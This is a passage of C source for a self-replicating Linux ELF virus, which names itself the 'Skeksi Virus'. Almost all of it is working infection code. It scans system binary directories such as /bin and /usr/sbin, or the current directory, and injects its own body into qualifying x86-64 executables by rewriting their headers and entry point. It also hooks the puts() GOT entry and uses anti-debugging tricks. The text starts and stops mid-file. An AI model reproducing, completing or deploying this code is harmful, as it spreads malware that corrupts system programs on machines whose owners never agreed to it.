	 ".globl real_start	\n"
 	 "real_start:		\n"
	 "push %rsp	\n"
	 "push %rbp	\n"
	 "push %rax	\n"
	 "push %rbx	\n"
	 "push %rcx	\n"
	 "push %rdx	\n"
	 "push %r8	\n"
	 "push %r9	\n"
	 "push %r10	\n"
	 "push %r11	\n"
	 "push %r12	\n"
	 "push %r13	\n"
	 "push %r14	\n"
	 "push %r15	  ");

#if 0
	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
#endif
	/*
	 * Load bootstrap pointer as argument to do_main()
	 * and call it.
	 */
	__ASM__ ( 
#if 0
	 "leaq %0, %%rdi\n"
#endif
	 "call do_main   " //:: "g"(bootstrap)
	);
	/*
	 * Restore register state
	 */
	__ASM__ (
	 "pop %r15	\n"
	 "pop %r14	\n"
	 "pop %r13	\n"
	 "pop %r12	\n"
	 "pop %r11	\n"
	 "pop %r10	\n"
	 "pop %r9	\n"
	 "pop %r8	\n"
	 "pop %rdx	\n"
	 "pop %rcx	\n"
	 "pop %rbx	\n"
	 "pop %rax	\n"
	 "pop %rbp	\n"
	 "pop %rsp	\n"	
	 "add $0x8, %rsp\n"
	 "jmp end_code	" 
	);
}

/*
 * l33t sp34k version of puts. We infect PLTGOT
 * entry for puts() of infected binaries.
 */

int evil_puts(const char *string)
{
	char *s = (char *)string;
	char new[1024];
	int index = 0;
	int rnum = get_random_number(5);
	if (rnum != 3)
		goto normal;

	Memset(new, 0, 1024);
	while (*s != '\0' && index < 1024) {
		switch(_toupper(*s)) {
			case 'I':
				new[index++] = '1';
				break;
			case 'E':
				new[index++] = '3';
				break;
			case 'S':
				new[index++] = '5';
				break;
			case 'T':
				new[index++] = '7';
				break;
			case 'O':
				new[index++] = '0';
				break;	
			case 'A':
				new[index++] = '4';
				break;
			default:
				new[index++] = *s;
				break;
		}
		s++;
	}
	return _puts_nl(new);
normal:
	return _puts_nl((char *)string);
}

/*
 * Heap areas are created by passing a NULL initialized
 * pointer by reference.
 */
#define CHUNK_SIZE 256
void * vx_malloc(size_t len, uint8_t **mem)
{
	if (*mem == NULL) {
		*mem = _mmap(NULL, 0x200000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (*mem == MAP_FAILED) {
			DEBUG_PRINT("malloc failed with mmap\n");
			Exit(-1);
		}
	}
	*mem += CHUNK_SIZE;
	return (void *)((char *)*mem - len);
}

static inline void vx_free(uint8_t *mem)
{
	uintptr_t addr = (uintptr_t)mem;
	if ((addr & 0x000000000fff) == 0) {
		_munmap(mem, 0x200000);
		return;
	}
	addr -= CHUNK_SIZE;
	mem = (uint8_t *)addr;
}

static inline int _rand(long *seed) // RAND_MAX assumed to be 32767
{
        *seed = *seed * 1103515245 + 12345;
        return (unsigned int)(*seed / 65536) & 32767;
}
/*
 * We rely on ASLR to get our psuedo randomness, since RSP will be different
 * at each execution.
 */
static inline uint32_t get_random_number(int max)
{
	struct timeval tv;
	_gettimeofday(&tv, NULL);
	return _rand(&tv.tv_usec) % max;
}

static inline char * randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(DIR_COUNT)];
}

char * full_path(char *exe, char *dir, uint8_t **heap)
{
	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, heap);
	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
	_memcpy(ptr, dir, _strlen(dir));
	ptr[_strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	_memcpy(&ptr[_strlen(dir) + 1], exe, _strlen(exe));
	return ptr;
}

#define JMPCODE_LEN 6

int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t *self, ElfW(Addr) orig_entry_point)
{
	int ofd;
	unsigned int c;
	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
	unsigned char *mem = target->mem;
	unsigned char *parasite = self->mem;
	char *host = target->path, *protected; 
	struct stat st;

	_memcpy((struct stat *)&st, (struct stat *)&target->st, sizeof(struct stat));

        /* eot is: 
         * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
         * end_of_text += p_hdr->p_filesz;
         */ 
        extern int return_entry_start;

        if ((ofd = _open(TMP, O_CREAT|O_WRONLY|O_TRUNC, st.st_mode)) == -1) 
                return -1;

        /*
         * Write first 64 bytes of original binary (The elf file header) 
         * [ehdr] 
         */
        if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
		return -1;

        /*
         * Now inject the virus
         * [ehdr][virus]
         */
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
        void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
	int end_code_size = (int)((char *)f2 - (char *)f1);
 	Elf64_Addr end_code_addr = PIC_RESOLVE_ADDR(&end_code);
        uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3};
	*(uint32_t *)&jmp_patch[1] = orig_entry_point;
	/*
	 * Write parasite up until end_code()
	 */
	size_t initial_parasite_len = self->size - RODATA_PADDING;
	initial_parasite_len -= end_code_size;

	if ((c = _write(ofd, parasite, initial_parasite_len)) != initial_parasite_len) {
		return -1;
	}
	_write(ofd, jmp_patch, sizeof(jmp_patch));
	_write(ofd, &parasite[initial_parasite_len + sizeof(jmp_patch)], RODATA_PADDING + (end_code_size - sizeof(jmp_patch)));

	/*
         * Seek to end of tracer.o + PAGE boundary  
         * [ehdr][virus][pad]
         */
        uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
        if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
		return -1;

        /*
         * Write the rest of the original binary
         * [ehdr][virus][pad][phdrs][text][data][shdrs]
         */
        mem += sizeof(Elf64_Ehdr);

        unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
        if ((c = _write(ofd, mem, final_length)) != final_length) 
		return -1;

	_close(ofd);

	return 0;
}

Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	int fd;
	int text_found = 0, i;
        Elf64_Addr orig_entry_point;
        Elf64_Addr origText;
	Elf64_Addr new_base;
	size_t parasiteSize;
	size_t paddingSize;
	struct stat st;
	char *host = target->path;
	long o_entry_offset;
	/*
	 * Get size of parasite (self)
	 */
        parasiteSize = self->size;
	paddingSize = PAGE_ALIGN_UP(parasiteSize);

	mem = target->mem;
	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
	ehdr = (Elf64_Ehdr *)target->ehdr;
	phdr = (Elf64_Phdr *)target->phdr;
	shdr = (Elf64_Shdr *)target->shdr;
	orig_entry_point = ehdr->e_entry;

	phdr[0].p_offset += paddingSize;
        phdr[1].p_offset += paddingSize;

        for (i = 0; i < ehdr->e_phnum; i++) {
                if (text_found)
                        phdr[i].p_offset += paddingSize;

                if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
                                origText = phdr[i].p_vaddr;
                                phdr[i].p_vaddr -= paddingSize;
				phdr[i].p_paddr -= paddingSize;
                                phdr[i].p_filesz += paddingSize;
                                phdr[i].p_memsz += paddingSize;
				phdr[i].p_align = 0x1000; // this will allow infected bins to work with PaX :)
				new_base = phdr[i].p_vaddr;
				text_found = 1;
                } else {
			if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset && (phdr[i].p_flags & PF_W))
				phdr[i].p_align = 0x1000; // also to  allow infected bins to work with PaX :)
		}

        }
        if (!text_found) {
                DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
                return -1;
        }
	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
	for (i = 0; i < ehdr->e_shnum; i++) {
	/*
	 * This makes the Virus strip safe, as it will be contained within a section now.
	 * It also makes it so that the e_entry still points into the .text section which
	 * may set off less heuristics.
	 */
                if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
                        shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
			shdr[i].sh_addr = origText - paddingSize;
			shdr[i].sh_addr += sizeof(ElfW(Ehdr));
                        shdr[i].sh_size += self->size;
                }  
                else 
			shdr[i].sh_offset += paddingSize;

	}
	ehdr->e_shoff += paddingSize;
	ehdr->e_phoff += paddingSize;

	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);

	return new_base;
}
/*
 * Since our parasite exists of both a text and data segment
 * we include the initial ELF file header and phdr in each parasite
 * insertion. This lends itself well to being able to self-load by
 * parsing our own program headers etc.
 */
int load_self(elfbin_t *elf)
{	
	int i;
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start);
	elf->mem = (uint8_t *)_start_addr;
	elf->size = (char *)&end_code - (char *)&_start; 
	elf->size += (int)((char *)f2 - (char *)f1);
	//elf->size += 1024; // So we have .rodata included in parasite insertion
	elf->size += RODATA_PADDING; //SKEKSI_BYTECODE_SIZE;
	return 0;
}

void unload_target(elfbin_t *elf)
{
	_munmap(elf->mem, elf->size);
	_close(elf->fd);
}

int load_target(const char *path, elfbin_t *elf)
{
	int i;
	struct stat st;
	elf->path = (char *)path;
	int fd = _open(path, O_RDONLY, 0);
	if (fd < 0)
		return -1;
	elf->fd = fd;
	if (_fstat(fd, &st) < 0)
		return -1;
	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (elf->mem == MAP_FAILED)
		return -1;
	elf->ehdr = (Elf64_Ehdr *)elf->mem;
	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
	for (i = 0; i < elf->ehdr->e_phnum; i++) {
		switch(elf->phdr[i].p_type) {	
			case PT_LOAD:
				switch(!!elf->phdr[i].p_offset) {
                        	case 0:
                                	elf->textVaddr = elf->phdr[i].p_vaddr;
                                	elf->textSize = elf->phdr[i].p_memsz;
                                	break;
                               	case 1:
                                	elf->dataVaddr = elf->phdr[i].p_vaddr;
                                	elf->dataSize = elf->phdr[i].p_memsz;
                                	elf->dataOff = elf->phdr[i].p_offset;
					break;
                        }
				break;
			case PT_DYNAMIC:
				elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
				break;
		}

        }
	elf->st = st;
	elf->size = st.st_size;
	return 0;
}

int load_target_writeable(const char *path, elfbin_t *elf)
{
        int i;
        struct stat st;
        elf->path = (char *)path;
        int fd = _open(path, O_RDWR, 0);
        if (fd < 0)
                return -1;
        elf->fd = fd;
        if (_fstat(fd, &st) < 0)
                return -1;
        elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
        if (elf->mem == MAP_FAILED)
                return -1;
        elf->ehdr = (Elf64_Ehdr *)elf->mem;
        elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
        elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
        for (i = 0; i < elf->ehdr->e_phnum; i++) {
                switch(elf->phdr[i].p_type) {
                        case PT_LOAD:
                                switch(!!elf->phdr[i].p_offset) {
                                case 0:
                                        elf->textVaddr = elf->phdr[i].p_vaddr;
                                        elf->textSize = elf->phdr[i].p_memsz;
                                        break;
                                case 1:
                                        elf->dataVaddr = elf->phdr[i].p_vaddr;
                                        elf->dataSize = elf->phdr[i].p_memsz;
                                        elf->dataOff = elf->phdr[i].p_offset;
                                        break;
                        }
                                break;
                        case PT_DYNAMIC:
                                elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
                                break;
                }

        }
        elf->st = st;
        elf->size = st.st_size;
        return 0;
}
/* 
 * We hook puts() for l33t sp34k 0utput. We parse the phdr's dynamic segment
 * directly so we can still infect programs that are stripped of section header
 * tables.
 */
int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
{
	int i, j = 0, symindex = -1;	
	Elf64_Sym *symtab;
	Elf64_Rela *jmprel;
	Elf64_Dyn *dyn = target->dyn;
	Elf64_Addr *gotentry, *pltgot;
	char *strtab;
	size_t strtab_size;
	size_t jmprel_size;
	Elf64_Addr gotaddr = 0; // INITIALIZE!
	Elf64_Off gotoff = 0;

	for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
		switch(dyn[i].d_tag) {
			case DT_SYMTAB: // relative to the text segment base
				symtab = (Elf64_Sym *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];			
				break;
			case DT_PLTGOT: // relative to the data segment base
				pltgot = (long *)&target->mem[target->dataOff + (dyn[i].d_un.d_ptr - target->dataVaddr)];
				break;
			case DT_STRTAB: // relative to the text segment base
				strtab = (char *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				break;
			case DT_STRSZ:
				strtab_size = (size_t)dyn[i].d_un.d_val;
				break;
			case DT_JMPREL:
				jmprel = (Elf64_Rela *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				break;
			case DT_PLTRELSZ:
				jmprel_size = (size_t)dyn[i].d_un.d_val;
				break;

		}
	}
	if (symtab == NULL || pltgot == NULL) {
		DEBUG_PRINT("Unable to locate symtab or pltgot\n");
		return -1;
	}

	for (i = 0; symtab[i].st_name <= strtab_size; i++) {
		if (!_strcmp(&strtab[symtab[i].st_name], "puts")) {
			DEBUG_PRINT("puts symbol index: %d\n", i);
			symindex = i;
			break;
		}	
	}
	if (symindex == -1) {
		DEBUG_PRINT("cannot find puts()\n");
		return -1;
	}
	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++) {
		if (!_strcmp(&strtab[symtab[ELF64_R_SYM(jmprel[i].r_info)].st_name], "puts")) {
			gotaddr = jmprel[i].r_offset;
			gotoff = target->dataOff + (jmprel[i].r_offset - target->dataVaddr);
			DEBUG_PRINT("gotaddr: %x gotoff: %x\n", gotaddr, gotoff);
			break;
		}
	}
	if (gotaddr == 0) {
		DEBUG_PRINT("Couldn't find relocation entry for puts\n");
		return -1;
	}

	gotentry = (Elf64_Addr *)&target->mem[gotoff];
	*gotentry = new_fn_addr;

	DEBUG_PRINT("patched GOT entry %x with address %x\n", gotaddr, new_fn_addr);
	return 0;

}
/*
 * Must be ELF
 * Must be ET_EXEC
 * Must be dynamically linked
 * Must not yet be infected
 */
int check_criteria(char *filename)
{
	int fd, dynamic, i, ret = 0;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[4096];
	uint32_t magic;

	fd = _open(filename, O_RDONLY, 0);
	if (fd < 0) 
		return -1;
	if (_read(fd, mem, 4096) < 0)
		return -1;
	_close(fd);
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) 
		return -1;
	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
	if (magic == MAGIC_NUMBER)  //already infected? Then skip this file
		return -1;
	if (ehdr->e_type != ET_EXEC) 
		return -1;
	if (ehdr->e_machine != EM_X86_64) 
		return -1;
	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
		if (phdr[i].p_type == PT_DYNAMIC)	
			dynamic++;
	if (!dynamic) 
		return -1;
	return 0;

}

void do_main(struct bootstrap_data *bootstrap)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem, *heap = NULL;
	long new_base, base_addr, evilputs_addr, evilputs_offset;
	struct linux_dirent64 *d;
	int bpos, fcount, dd, nread;
	char *dir = NULL, **files, *fpath, dbuf[32768];
	struct stat st;
	mode_t mode;
	uint32_t rnum;
	elfbin_t self, target;
	int scan_count = DIR_COUNT;
	int icount = 0;
	int paddingSize;
	/*
	 * NOTE: 
	 * we can't use string literals because they will be
	 * stored in either .rodata or .data sections.
	 */
	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" };
	char cwd[2] = {'.', '\0'};

#if ANTIDEBUG
        if (_ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
                _printf("!! Skeksi Virus, 2015 !!\n");
                Exit(-1);
        }
        _prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
#endif

rescan:
	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
	if (!_strcmp(dir, "."))
		scan_count = 1;
	DEBUG_PRINT("Infecting files in directory: %s\n", dir);

	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0);
	if (dd < 0) {
		DEBUG_PRINT("open failed\n");
		return;
	}

	load_self(&self);

	for (;;) {
		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768);
		if (nread < 0) {
			DEBUG_PRINT("getdents64 failed\n");
			return;
		}
		if (nread == 0)
			break;
		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
			d = (struct linux_dirent64 *) (dbuf + bpos);
    			bpos += d->d_reclen - 1;
			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) 
				continue;
			if (d->d_name[0] == '.')
				continue;
			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
				continue; 
			if (icount == 0)
				goto infect;
			rnum = get_random_number(10);
                        if (rnum != LUCKY_NUMBER)
                                continue;
infect:
			load_target(fpath, &target);
			new_base = infect_elf_file(&self, &target);
			unload_target(&target);
#ifdef INFECT_PLTGOT
			load_target_writeable(TMP, &target);
			base_addr = PIC_RESOLVE_ADDR(&_start);
			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
			evilputs_offset = evilputs_addr - base_addr;
			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
			unload_target(&target);
#endif

			_rename(TMP, fpath);
			icount++;
		}

	}
	if (--scan_count > 0) {
		_close(dd);
		goto rescan;
	}

	rnum = get_random_number(50);
	if (rnum == LUCKY_NUMBER) 
		display_skeksi();

}

int _getuid(void)
{
        unsigned long ret;
        __asm__ volatile("mov $102, %rax\n"
                         "syscall");
         asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

void Exit(long status)
{
        __asm__ volatile("mov %0, %%rdi\n"
                         "mov $60, %%rax\n"
                         "syscall" : : "r"(status));
}

long _open(const char *path, unsigned long flags, long mode)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
                        "mov $2, %%rax\n"
                        "syscall" : : "g"(path), "g"(flags), "g"(mode));
        asm ("mov %%rax, %0" : "=r"(ret));              

        return ret;
}

int _close(unsigned int fd)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov $3, %%rax\n"
                        "syscall" : : "g"(fd));
        return (int)ret;
}

int _read(long fd, char *buf, unsigned long len)
{
         long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $0, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

long _write(long fd, char *buf, unsigned long len)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $1, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;
}

int _fstat(long fd, void *buf)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $5, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _unlink(const char *path)
{
	   long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
			"mov $87, %%rax\n"		
			"syscall" ::"g"(path));
	asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _rename(const char *old, const char *new)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $82, %%rax\n"
                        "syscall" ::"g"(old),"g"(new));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

long _lseek(long fd, long offset, unsigned int whence)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $8, %%rax\n"
                        "syscall" : : "g"(fd), "g"(offset), "g"(whence));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;

}

int _fsync(int fd)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov $74, %%rax\n"
                        "syscall" : : "g"(fd));

        asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
        long mmap_fd = fd;
        unsigned long mmap_off = off;
        unsigned long mmap_flags = flags;
        unsigned long ret;

        __asm__ volatile(
                         "mov %0, %%rdi\n"
                         "mov %1, %%rsi\n"
                         "mov %2, %%rdx\n"
                         "mov %3, %%r10\n"
                         "mov %4, %%r8\n"
                         "mov %5, %%r9\n"
                         "mov $9, %%rax\n"
                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
        asm ("mov %%rax, %0" : "=r"(ret));              
        return (void *)ret;
}

int _munmap(void *addr, size_t len)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $11, %%rax\n"
                        "syscall" :: "g"(addr), "g"(len));
        asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _mprotect(void * addr, unsigned long len, int prot)
{
        unsigned long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $10, %%rax\n"
                        "syscall" : : "g"(addr), "g"(len), "g"(prot));
        asm("mov %%rax, %0" : "=r"(ret));

        return (int)ret;
}

long _ptrace(long request, long pid, void *addr, void *data)
{
        long ret;

        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov %3, %%r10\n"
                        "mov $101, %%rax\n"
                        "syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
        asm("mov %%rax, %0" : "=r"(ret));

        return ret;
}

int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
        long ret;

        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov %3, %%r10\n"
                        "mov $157, %%rax\n"
                        "syscall\n" :: "g"(option), "g"(arg2), "g"(arg3), "g"(arg4), "g"(arg5));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $217, %%rax\n"
                        "syscall" :: "g"(fd), "g"(dirp), "g"(count));
        asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

int _gettimeofday(struct timeval *tv, struct timezone *tz)
{
	long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $96, %%rax\n"
			"syscall" :: "g"(tv), "g"(tz));
	asm ("mov %%rax, %0" : "=r"(ret));
        return (int)ret;

}

void _memcpy(void *dst, void *src, unsigned int len)
{
        int i;
        unsigned char *s = (unsigned char *)src;
        unsigned char *d = (unsigned char *)dst;

        for (i = 0; i < len; i++) {
                *d = *s;
                s++, d++;
        }

}


void Memset(void *mem, unsigned char byte, unsigned int len)
{
        unsigned char *p = (unsigned char *)mem; 
        int i = len;
        while (i--) {
                *p = byte;
                p++;
        }
}

int _printf(char *fmt, ...)
{
        int in_p;
        unsigned long dword;
        unsigned int word;
        char numbuf[26] = {0};
        __builtin_va_list alist;

        in_p;
        __builtin_va_start((alist), (fmt));

        in_p = 0;
        while(*fmt) {
                if (*fmt!='%' && !in_p) {
                        _write(1, fmt, 1);
                        in_p = 0;
                }
                else if (*fmt!='%') {
                        switch(*fmt) {
                                case 's':
                                        dword = (unsigned long) __builtin_va_arg(alist, long);
                                        _puts((char *)dword);
                                        break;
                                case 'u':
                                        word = (unsigned int) __builtin_va_arg(alist, int);
                                        _puts(itoa(word, numbuf));
                                        break;
                                case 'd':
                                        word = (unsigned int) __builtin_va_arg(alist, int);
                                        _puts(itoa(word, numbuf));
                                        break;
                                case 'x':
                                        dword = (unsigned long) __builtin_va_arg(alist, long);
                                        _puts(itox(dword, numbuf));
                                        break;
                                default:
                                        _write(1, fmt, 1);
                                        break;
                        }
                        in_p = 0;
                }
                else {
                        in_p = 1;
                }
                fmt++;
        }
        return 1;
}
char * itoa(long x, char *t)
{
        int i;
        int j;

        i = 0;
        do
        {
                t[i] = (x % 10) + '0';
                x /= 10;
                i++;
        } while (x!=0);

        t[i] = 0;

        for (j=0; j < i / 2; j++) {
                t[j] ^= t[i - j - 1];
                t[i - j - 1] ^= t[j];
                t[j] ^= t[i - j - 1];
        }

        return t;
}
char * itox(long x, char *t)
{
        int i;
        int j;

        i = 0;
        do
        {
                t[i] = (x % 16);

                /* char conversion */
                if (t[i] > 9)
                        t[i] = (t[i] - 10) + 'a';
                else
                        t[i] += '0';

                x /= 16;
                i++;
        } while (x != 0);

        t[i] = 0;

        for (j=0; j < i / 2; j++) {
                t[j] ^= t[i - j - 1];
                t[i - j - 1] ^= t[j];
                t[j] ^= t[i - j - 1];
        }

        return t;
}

int _puts(char *str)
{
        _write(1, str, _strlen(str));
        _fsync(1);

        return 1;
}

int _puts_nl(char *str)
{	
        _write(1, str, _strlen(str));
	_write(1, "\n", 1);
	_fsync(1);

        return 1;
}

size_t _strlen(char *s)
{
        size_t sz;

        for (sz=0;s[sz];sz++);
        return sz;
}



char _toupper(char c)
{
	if( c >='a' && c <= 'z')
		return (c = c +'A' - 'a');
	return c;

}


int _strncmp(const char *s1, const char *s2, size_t n)
{
	for ( ; n > 0; s1++, s2++, --n)
		if (*s1 != *s2)
			return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
		else if (*s1 == '\0')
			return 0;
	return 0;
}

int _strcmp(const char *s1, const char *s2)
{
	for ( ; *s1 == *s2; s1++, s2++)
		if (*s1 == '\0')
	    		return 0;
	return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
}

int _memcmp(const void *s1, const void *s2, unsigned int n)
{
        unsigned char u1, u2;

        for ( ; n-- ; s1++, s2++) {
                u1 = * (unsigned char *) s1;
                u2 = * (unsigned char *) s2;
        if ( u1 != u2) {
                return (u1-u2);
        }
    }
}





unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__ 
	(
	"call get_rip_label	\n"
       	".globl get_rip_label	\n"
       	"get_rip_label:		\n"
        "pop %%rax		\n"
	"mov %%rax, %0" : "=r"(ret)
	);

	return ret;
}


/*
 * end_code() gets over-written with a trampoline
 * that jumps to the original entry point.
 */
void end_code() 
{
	Exit(0);

}

void dummy_marker()
{
	__ASM__("nop");
}


const unsigned char skeksi_banner[] =
"\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
"\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40"
"\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30"
"\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30"
